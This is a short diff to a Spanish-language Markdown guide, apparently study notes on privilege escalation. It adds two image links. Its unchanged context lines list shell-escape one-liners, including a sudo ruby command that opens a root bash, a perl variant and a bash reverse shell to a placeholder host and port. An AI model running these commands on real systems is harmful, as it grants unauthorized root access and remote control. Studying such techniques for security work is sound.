@@ -265,6 +265,8 @@
   - `su` (sin argumentos, cambia a root)
 - **e) Herramienta alterna:** `sudo -i`, `login`
 
+![MM](images/MM.PNG)
+
 ---
 
 ### `sudo /usr/bin/ruby -e 'exec "/bin/bash"'`
@@ -279,6 +281,8 @@
   - `perl -e 'exec "/bin/bash"'`
   - `bash -i >& /dev/tcp/host/port 0>&1`
 - **e) Herramienta alterna:** `python`, `perl`, `awk`
+
+![KK](images/KK.PNG)
 
 ---
 
